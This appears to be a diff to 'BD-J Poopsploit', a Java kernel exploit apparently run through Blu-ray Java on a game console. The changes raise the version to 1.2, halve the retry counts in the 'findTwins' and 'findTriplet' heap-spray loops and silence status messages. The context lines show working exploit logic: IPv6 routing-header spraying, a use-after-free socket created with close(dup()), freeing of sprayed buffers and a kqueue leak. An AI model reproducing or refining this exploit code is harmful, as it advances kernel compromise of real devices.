@@ -15,7 +15,7 @@ import java.io.*;
 
 public class Poops {
     
-    private static final String VERSION_STRING = "BD-J Poopsploit 1.0";
+    private static final String VERSION_STRING = "BD-J Poopsploit 1.2";
     
     private static final int KERNEL_PID = 0;
     
@@ -591,7 +591,7 @@ public class Poops {
     
     private static boolean findTwins() {
         int attempts = 0;
-        while (attempts < 10000) {
+        while (attempts < 5000) {
             for (int i = 0; i < ipv6Socks.length; i++) {
                 sprayRthdr.putInt(0x04, RTHDR_TAG | i);
                 setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
@@ -616,7 +616,7 @@ public class Poops {
     // Thanks cow for optimization
     private static int findTriplet(int master, int other) {
         int attempts = 0;
-        while (attempts < 10000) {
+        while (attempts < 5000) {
             for (int i = 0; i < ipv6Socks.length; i++) {
                 if (i == master || i == other) {
                     continue;
@@ -730,7 +730,7 @@ public class Poops {
         // Note: Only dup works because it does not check f_hold.
         close(dup(uafSock));
         
-        Status.println("Finding twins...");
+        // Status.println("Finding twins...");
         
         // Find twins.
         if(!findTwins()) {
@@ -738,9 +738,9 @@ public class Poops {
             return false;
         }
         
-        Status.println("Twins found : " + String.valueOf(twins[0]) + ", " + String.valueOf(twins[1]));
+        // Status.println("Twins found : " + String.valueOf(twins[0]) + ", " + String.valueOf(twins[1]));
 
-        Status.println("Finding triplets...");
+        // Status.println("Finding triplets...");
         // Free one.
         freeRthdr(ipv6Socks[twins[1]]);
 
@@ -797,7 +797,7 @@ public class Poops {
 
 
     private static boolean leakKqueue() {
-        Status.println("Leaking kqueue...");
+        // Status.println("Leaking kqueue...");
 
         // Free one.
         freeRthdr(ipv6Socks[triplets[1]]);
